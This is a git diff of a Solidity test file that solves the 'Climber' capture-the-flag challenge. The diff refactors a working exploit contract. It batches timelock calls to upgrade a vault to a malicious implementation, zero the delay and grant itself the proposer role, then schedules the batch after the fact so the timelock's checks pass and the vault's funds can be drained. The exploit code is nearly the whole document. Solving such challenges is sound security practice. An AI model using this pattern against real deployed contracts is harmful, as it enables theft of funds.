@@ -101,38 +101,13 @@ contract ClimberChallenge is Test {
      */
     function test_climber() public checkSolvedByPlayer {
         MaliciousImplementation newVault = new MaliciousImplementation();
-        ExploitTimelockExecute exploiter = new ExploitTimelockExecute();
-        address[] memory targets = new address[](4);
-        // targets[0] = address(timelock);
-        targets[0] = address(vault);
-        targets[1] = address(timelock);
-        targets[2] = address(timelock);
-        targets[3] = address(exploiter);
-        uint256[] memory values = new uint256[](4);
-        values[0] = 0;
-        values[1] = 0;
-        values[2] = 0;
-        values[3] = 0;
-
-        bytes[] memory dataElements = new bytes[](4);
-        bytes32 salt = keccak256("salt");
-
-        dataElements[0] = abi.encodeCall(
-            UUPSUpgradeable.upgradeToAndCall,
-            (address(newVault), "")
-        );
-        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
-        dataElements[2] = abi.encodeCall(
-            AccessControl.grantRole,
-            (keccak256("PROPOSER_ROLE"), address(exploiter))
-        );
-        dataElements[3] = abi.encodeCall(
-            ExploitTimelockExecute.run,
-            (targets, values, salt, timelock, address(newVault))
+        ExploitTimelockExecute exploiter = new ExploitTimelockExecute(
+            vault,
+            timelock,
+            address(newVault)
         );
 
-        timelock.execute(targets, values, dataElements, salt);
-
+        exploiter.executeAttack();
         vault.sweepFunds(address(token));
         token.transfer(recovery, token.balanceOf(player));
     }
@@ -162,28 +137,52 @@ contract MaliciousImplementation is UUPSUpgradeable {
     }
 }
 contract ExploitTimelockExecute {
-    function run(
-        address[] calldata targets,
-        uint256[] calldata values,
-        bytes32 salt,
-        ClimberTimelock timelock,
-        address newVault
-    ) public {
-        bytes[] memory dataElements = new bytes[](4);
+    ClimberVault vault;
+    ClimberTimelock timelock;
+
+    address newVault;
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+    bytes32 salt = keccak256("salt");
+
+    constructor(
+        ClimberVault _vault,
+        ClimberTimelock _timelock,
+        address _newVault
+    ) {
+        vault = _vault;
+        timelock = _timelock;
+        newVault = _newVault;
+    }
+
+    function executeAttack() public {
+        // targets[0] = address(timelock);
+        targets[0] = address(vault);
+        targets[1] = address(timelock);
+        targets[2] = address(timelock);
+        targets[3] = address(this);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
         dataElements[0] = abi.encodeCall(
             UUPSUpgradeable.upgradeToAndCall,
             (newVault, "")
         );
         dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
-
         dataElements[2] = abi.encodeCall(
             AccessControl.grantRole,
             (keccak256("PROPOSER_ROLE"), address(this))
         );
-        dataElements[3] = abi.encodeCall(
-            this.run,
-            (targets, values, salt, timelock, newVault)
-        );
+        dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());
+        // maliciousScheduling(targets, values, dataElements, salt);
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+    function maliciousScheduling() external {
         timelock.schedule(targets, values, dataElements, salt);
     }
 }
